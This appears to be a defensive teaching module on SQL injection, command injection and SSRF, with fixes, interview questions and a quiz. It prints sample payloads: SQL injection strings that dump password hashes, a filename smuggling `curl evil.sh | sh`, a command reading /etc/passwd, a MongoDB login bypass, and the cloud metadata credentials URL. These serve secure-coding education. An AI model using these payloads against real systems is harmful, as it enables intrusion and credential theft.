The programmer's picture is a fixed template with two holes. The database's picture is different: it receives one string and runs the full lexer and parser on it. If `name` is `alice`, the parser sees a tree with a comparison `name = 'alice'` joined by AND to `pw = '...'`. If `name` is `alice' --`, the text becomes `... name = 'alice' --' AND pw = ''`. The lexer reads `'alice'` as a string literal, then `--` starts a comment that swallows the rest. The parse tree no longer contains the password check at all. If `name` is `x' OR '1'='1`, the tree has a new OR node that is always true. The attacker did not break anything in the database; they supplied tokens, and the parser built a different tree from them. This is the grammar view: the intended query is a program where user data occupies only literal leaves, and the attack adds quote tokens that let the data escape the literal and become operators.
Why does escaping not fully fix it? Escaping tries to make each special character harmless by writing `'` as `\'` or `''`. It must be correct for the exact dialect, the connection's character set, and the exact context (inside a string literal, a number, an identifier, a `LIKE` pattern). Mistakes are common: a numeric context needs no quote at all (`WHERE id = ` + id with id `1 OR 1=1`), multi-byte character sets such as GBK can swallow the escaping backslash (the classic `addslashes` bypass), and second-order injection stores data safely and later reuses it unescaped in another query. Escaping defends by guessing what the parser will do; each guess is a place for a bug.
Parameterization removes the guess. In a prepared statement the client sends the query text with placeholders first: `SELECT id FROM users WHERE name = $1 AND pw = $2`. The database parses it once and fixes the parse tree, with the placeholders as leaf nodes. Then the client sends the values in a separate message (in the PostgreSQL protocol, the Parse and Bind messages are distinct). Values are inserted as data into those leaves; they are never re-lexed, so a quote inside `name` is just a character in a string. There is no way for data to reach the lexer. (Some drivers emulate parameters on the client by escaping; true server-side binding is stronger, but a well-tested driver's client-side binding is still far better than hand-built strings.) This is the cleanest example of the principle: the structure comes from the program, the values from the user, and the interface never mixes them in one string.
Parameters work only for values. Identifiers and keywords, such as a table name, a column in `ORDER BY`, or the direction `ASC`/`DESC`, cannot be bound as parameters. For these, map the user's choice onto an allow-list in code (`{"name": "name", "date": "created_at"}`) and insert only the mapped constant. ORMs and query builders help, but their raw-SQL escape hatches (`.raw()`, `text()`, `format!`) reintroduce the problem. Dynamic SQL inside stored procedures does too.
Command injection follows the same pattern with a different interpreter. `os.system("ping -c 1 " + host)` hands the whole string to `/bin/sh`, which parses it: if `host` is `8.8.8.8; cat /etc/passwd`, the `;` ends the first command and a second runs. The metacharacters include `; | & $( ) ` > < newline`. The fix is to avoid the shell: pass an argument vector to the operating system, `subprocess.run(["ping", "-c", "1", host])`, where the program path and each argument are separate strings and no parser exists to reinterpret them. One caution remains: a value that starts with `-` can still be read as an option by the program itself (use `--` to end options, and validate the format).
SSRF is injection into a destination instead of a command. A feature fetches a URL given by the user (a webhook test, an image import, a PDF render). If the server fetches `http://169.254.169.254/latest/meta-data/iam/security-credentials/` it reaches the cloud instance metadata service, which hands out temporary credentials for the instance's role. The bug is that the user chooses where the server's network position, which is trusted, points. Defences are several: an allow-list of permitted hosts, resolving the name and rejecting private, loopback and link-local addresses, connecting to the checked address itself (to defeat DNS rebinding, where the name resolves to a safe address at check time and an internal one at connection time), refusing or re-checking redirects, limiting the protocol to https, and egress filtering at the network level. On AWS, the instance metadata service v2 (IMDSv2) requires a session token obtained with a PUT request and, by default, a hop limit of 1, which stops most SSRF and container escapes from reaching it.

example: Follow a real exploit from start to end. A product search page runs `SELECT name, price FROM products WHERE category = '` + c + `'`, where `c` comes from the URL. The attacker requests `c = zzz' UNION SELECT username, password_hash FROM users --`. The query becomes:
```sql
SELECT name, price FROM products WHERE category = 'zzz'
UNION SELECT username, password_hash FROM users --'
```
The first part matches no product, the `UNION` appends rows from the `users` table with the same two columns, and `--` comments out the trailing quote. The page now lists every username with its password hash in the product table. With a few more requests the attacker reads the schema (`information_schema.tables`), and where the database allows stacked statements or file functions, may change data or write files. If the page shows no output, "blind" techniques read one bit at a time through true/false behaviour or response time (`AND (SELECT SUBSTR(password_hash,1,1) FROM users LIMIT 1) = 'a'`), which automated tools such as sqlmap run at thousands of requests per minute.
The fix in code, using psycopg (PostgreSQL) as the example:
```python
cur.execute(
    "SELECT name, price FROM products WHERE category = %s",
    (category,),                    # bound separately, never parsed
)

SORTS = {"price": "price", "name": "name"}   # allow-list: ORDER BY
col = SORTS.get(sort_param, "name")
cur.execute(f"SELECT name, price FROM products ORDER BY {col}")
```
With the attack string, the first query looks for a category literally named `zzz' UNION SELECT ...`, finds none and returns an empty page. The second pattern shows how to handle identifiers: the user's string is only a key into a fixed dictionary, and what enters the SQL is a constant from your code.
Two more cases in short. Command injection: a thumbnail service runs `convert ` + filename + ` out.png` through a shell. A file named `a.png; curl evil.sh | sh` runs the attacker's script. With `subprocess.run(["convert", "--", filename, "out.png"])` the filename is a single argument whatever it contains. SSRF: an "import from URL" endpoint accepts `http://169.254.169.254/...`. With an allow-list check `host in {"images.example.com"}`, and a resolved-IP check that refuses private ranges, the request is rejected. Even if the check is skipped, a metadata service that requires IMDSv2 tokens answers 401 to a plain GET.
Last, a number for risk and cost. A WAF rule that blocks `' OR 1=1` patterns takes minutes to deploy and stops the cheap scanners, but attackers bypass signatures by encoding, comments, case changes and alternative syntax. The parameterized query takes one line to write and removes the whole class for that statement. This is why the defence belongs in the code that builds the query, with a WAF only as a safety net.
intuition: Injection is like a clerk who reads a customer's note aloud and obeys it: if the note says "and also open the safe", the clerk cannot tell the note's words from the manager's orders.
The bug is natural because strings carry no label saying which characters are code and which are data. Concatenation erases the boundary, and the interpreter at the other end sees only one stream. The robust answer is therefore structural: send code and data through different channels (the query text and the bound values; the program path and its argument array; the allowed destination list and the user's request). When the channels are separate, no input can change the structure, so one rule replaces a long list of dangerous characters.
mistakes: People often think sanitising or escaping input once, on entry, is enough. In fact the right escaping depends on where the value is used (SQL string, SQL number, shell argument, HTML text, URL), and data is often used in several places later. Context-specific escaping at the point of use, or better, no string-building at all, is what works. Input validation is useful as an extra layer, not as the main defence.
People often think an ORM makes injection impossible. In fact ORMs parameterize their normal calls, but every ORM has raw or string-format escape hatches, and building a filter, sort column or `LIKE` pattern from user text through them is vulnerable. Check these call sites in code review.
People often think a WAF or a deny-list of bad characters solves it. In fact filters are bypassed by encodings, case, comments, whitespace variations and by legitimate input such as a name with an apostrophe (O'Brien) that the filter wrongly blocks. A WAF reduces noise from automated scans; it is not a fix.
People often think SSRF only matters if the server shows the fetched response. In fact blind SSRF still lets an attacker scan internal ports by timing, call internal admin endpoints that act on a GET or POST, and trigger actions in services that trust the network. Showing the response is the worst case, not the only case.
People often think parameterized queries protect every part of a statement. In fact placeholders can stand only for values, not for table names, column names, `ORDER BY` terms or SQL keywords, and they do not protect dynamic SQL assembled inside a stored procedure. Those parts need an allow-list.
friction: The defence is simple in principle but hard to apply everywhere. A large code base has hundreds of places where text is passed to an interpreter, not only SQL: shell commands, LDAP filters, XPath, NoSQL operators (a JSON body `{"user": {"$ne": null}}` can bypass a MongoDB login), template engines (server-side template injection), log formatters, XML parsers (XXE), expression languages and deserialisers. Each needs its own safe API, and one forgotten call site is enough. Static analysis (taint tracking) finds many, but not all, especially across services and data stores where tainted data is stored and reused later (second-order injection).
Some uses need dynamic structure by design: analytics tools and query builders that let users choose columns, filters and sorts, or "search" boxes that expose a query language. For these the safe approach is a structured request (a JSON description of the query) that the server translates into SQL using allow-lists, with a read-only role and limits on cost. Even then, the cost of a query (a huge join) can be a denial of service.
SSRF is harder than SQL injection because there is no equivalent of the prepared statement. A URL is a legitimate input, hostnames can resolve to different addresses over time, redirects and URL parser differences (the check library and the HTTP library parse the same URL differently) allow bypasses, and cloud networks are full of trusting internal endpoints. Complete protection needs layers: allow-lists, network egress rules, metadata hardening and least-privilege credentials.
Finally, the principle is being re-learned in new areas. Language-model applications put instructions and untrusted documents in one prompt; the model has no hard boundary between them, so prompt injection has no equivalent of the parameterized query yet. Mitigations (separating channels where possible, limiting tool permissions, validating outputs) reduce but do not remove the risk.
practice: Use parameterized queries for every SQL statement that includes external data, with no exceptions, and review every use of string formatting (`f"..."`, `+`, `.format`, `%`) near `execute`. Use an allow-list mapping for identifiers and sort directions. Run the application with a database account that has only the rights it needs (no DROP, no file access, read-only for read paths), so a successful injection has limited reach.
Avoid the shell. Use argument arrays (`subprocess.run([...])` with `shell=False`, Go's `exec.Command(name, args...)`, Java's `ProcessBuilder`), end option lists with `--`, and validate the format of values (an IP address, an identifier matching `^[a-z0-9_]+$`). Prefer a library call to spawning a process at all.
For server-side fetches, build an allow-list of destination hosts; resolve the name, reject loopback, private (10/8, 172.16/12, 192.168/16), link-local (169.254/16) and unique-local IPv6 ranges, and connect to the resolved address; disable or re-validate redirects; restrict to https; run the fetcher in a network segment with egress rules; require IMDSv2 and set the hop limit to 1 on cloud instances. Give the workload the least IAM permissions, so stolen credentials are of little use.
Verify and monitor. Add linters and static analysis (CodeQL, Semgrep rules for SQL string building and `shell=True`), write tests that send a quote, a semicolon and an internal URL to each endpoint, and run a scanner or fuzzer in staging. Log rejected inputs and alert on database errors that mention syntax. Keep a WAF as a second layer, and treat any hit it reports as a sign that the real fix is missing in code.
tradeoffs: Parameterized queries versus escaping. Choose parameterization for all values: it is simple, fast (the statement can be cached and reused) and does not depend on dialect details. Use escaping only where parameters are impossible, such as inside a `LIKE` pattern (escape `%` and `_`) or when a legacy API offers nothing else, and then use the driver's own function. You give up nothing but a little flexibility in dynamic structure.
Allow-list versus deny-list. Choose allow-lists for identifiers, hosts, file names and commands: the set of valid values is small and known. A deny-list of bad characters is long, always incomplete and blocks valid input. The cost of an allow-list is maintenance when the valid set changes.
Prepared statements versus stored procedures. Choose parameterized statements in the application for most work. Choose stored procedures when you need to limit database privileges to specific operations (the application account can only call procedures); remember that dynamic SQL inside them is injectable. Procedures add deployment complexity and make logic less visible to application developers.
Network-level defence versus application-level for SSRF. Choose egress filtering and metadata hardening as the foundation: they work even if code has a bug. Add application allow-lists for the fine-grained rules. Application checks alone are fragile because of parsing and DNS tricks; network rules alone cannot distinguish between two internal services your server must reach.
WAF versus code fixes. Choose a WAF when you must protect legacy software quickly or want visibility into attack traffic; accept false positives and bypasses. Choose code fixes for lasting safety. The best choice is both, with the code fix as the real control.
interview: Explain why parameterized queries prevent SQL injection, in terms of parsing. || The database parses the SQL text with placeholders first, fixing the parse tree. The values are sent separately and bound into leaf positions as data; they are never lexed as SQL, so quotes and keywords in them cannot create new operators. Injection needs input to change the parse tree, and here the tree is built before the input arrives.
A product lets users choose the sort column. How do you do it safely? || Placeholders cannot represent identifiers. Map the user's choice through an allow-list (a dictionary from public names to column names, plus ASC/DESC) and put only the mapped constant into the SQL. Reject unknown values with an error, and keep the query otherwise parameterized.
How would you design a "fetch this URL" feature that is safe against SSRF? || Allow-list destination hosts if possible; otherwise resolve the name, reject private, loopback, link-local and metadata addresses, connect to the validated IP (against DNS rebinding), re-check on each redirect, allow only https and limited ports, set short timeouts and size limits, and run the fetcher in a network segment with egress rules and no cloud credentials.
How did the Capital One breach work, and what would have stopped it? || An SSRF flaw in a web application firewall let the attacker make the server call the EC2 metadata endpoint and obtain temporary role credentials, which had broad S3 access. Stops: IMDSv2 (token and hop limit), least-privilege IAM roles, egress filtering, and fixing the WAF configuration.
Your team finds a command injection in an image conversion service. What is the fix and the follow-up? || Replace shell string building with an argument array, end options with `--`, and validate the file name. Follow up: run the converter with minimal privileges and in a sandbox (seccomp, no network, read-only file system), search the code base for similar patterns, add a lint rule, and rotate any secrets the process could read.
What is second-order injection, and why do input filters miss it? || Malicious data is stored safely at first (for example escaped or parameterized on insert) and later read back and concatenated into a new query or command, where it is interpreted. Filters at the entry point see nothing wrong. The defence is to use parameterized queries and safe APIs on every use of data, including data from your own database.
quiz: What condition makes an input an injection attack, in terms of the parse tree? || The input changes the syntactic structure of the command (its parse tree) instead of staying at a leaf as a literal value. This is the Su and Wassermann definition.
Why can you not use a placeholder for a table or column name? || The statement's structure, including which tables and columns it uses, is fixed when it is parsed; placeholders can only stand for values bound after parsing. Identifiers must come from an allow-list in code.
Why does `subprocess.run(["ping", host])` avoid command injection while `os.system("ping " + host)` does not? || The first passes the arguments directly to the operating system with no shell, so no parser interprets `;`, `|` or `$()`. The second hands the whole string to `/bin/sh`, which parses metacharacters and runs extra commands.
A scanner sends 5,000 requests per minute testing 20 payloads on each of 100 parameters. How long until all combinations are tried once? || 20 × 100 = 2,000 requests, which takes 2,000 / 5,000 = 0.4 minute, about 24 seconds. Automated scanning is very cheap, so every public parameter should be assumed to be tested.
Why is a WAF not a sufficient defence against SQL injection? || It matches patterns, and attackers bypass them with encodings, comments and alternative syntax, while it may block valid input. The root cause is in the code that builds the query, so only parameterization removes it; a WAF is a second layer.
